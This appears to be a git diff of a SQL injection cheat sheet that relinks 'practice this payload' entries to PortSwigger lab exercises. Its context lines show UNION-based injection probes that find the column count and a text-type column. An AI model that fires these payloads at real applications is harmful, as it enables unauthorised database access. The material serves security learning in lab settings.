@@ -285,6 +285,8 @@ etc...
 ' ORDER BY 12-- -
 etc...
 ```
+- [Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
+
 ## Finding columns with a useful data type
 ```sql
 ' UNION SELECT 'test',NULL,NULL,NULL,NULL,NULL--
@@ -295,8 +297,7 @@ etc...
 ' UNION SELECT NULL,NULL,NULL,NULL,NULL,'test'--
 ```
 
-
-- [Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
+- [Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
 
 ## Listing the database contents on non-Oracle databases (Method 1)
 1. Determinate the name of the databases
